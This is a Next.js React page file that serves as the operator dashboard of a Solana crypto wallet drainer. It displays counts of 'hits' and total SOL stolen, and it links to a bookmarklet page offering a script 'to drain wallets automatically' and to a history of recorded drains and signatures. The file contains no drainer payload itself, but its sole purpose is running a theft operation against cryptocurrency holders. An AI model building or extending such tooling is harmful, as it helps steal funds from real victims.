// src/app/dashboard/page.js
'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';

export default function DashboardPage() {
    const [stats, setStats] = useState({ hits: 0, totalSol: 0 });

    useEffect(() => {
        fetch('/api/stats')
            .then(res => res.json())
            .then(data => setStats(data));
    }, []);

    return (
        <div className="min-h-screen bg-slate-900 text-white p-8">
            <h1 className="text-4xl font-bold mb-8 text-center">Drainer Dashboard</h1>
            
            <div className="max-w-4xl mx-auto grid grid-cols-1 md:grid-cols-2 gap-6">
                <Link href="/bookmarklet" className="bg-emerald-600 p-6 rounded-xl hover:bg-emerald-500 transition shadow-lg flex flex-col items-center justify-center text-center">
                    <h2 className="text-2xl font-bold mb-2">Install Bookmarklet</h2>
                    <p className="text-emerald-100">Get the script to drain wallets automatically.</p>
                </Link>

                <Link href="/hits" className="bg-blue-600 p-6 rounded-xl hover:bg-blue-500 transition shadow-lg flex flex-col items-center justify-center text-center">
                    <h2 className="text-2xl font-bold mb-2">View Hits History</h2>
                    <p className="text-blue-100">See all recorded drains and signatures.</p>
                </Link>
            </div>

            <div className="max-w-4xl mx-auto mt-8">
                <div className="bg-slate-800 p-6 rounded-lg">
                    <h2 className="text-xl font-bold mb-4">Quick Stats</h2>
                    <div className="grid grid-cols-2 gap-4">
                        <div className="bg-slate-700 p-4 rounded">
                            <div className="text-slate-400 text-sm">Total Hits</div>
                            <div className="text-3xl font-bold text-blue-400">{stats.hits}</div>
                        </div>
                        <div className="bg-slate-700 p-4 rounded">
                            <div className="text-slate-400 text-sm">Total SOL</div>
                            <div className="text-3xl font-bold text-emerald-400">{stats.totalSol.toFixed(4)}</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}
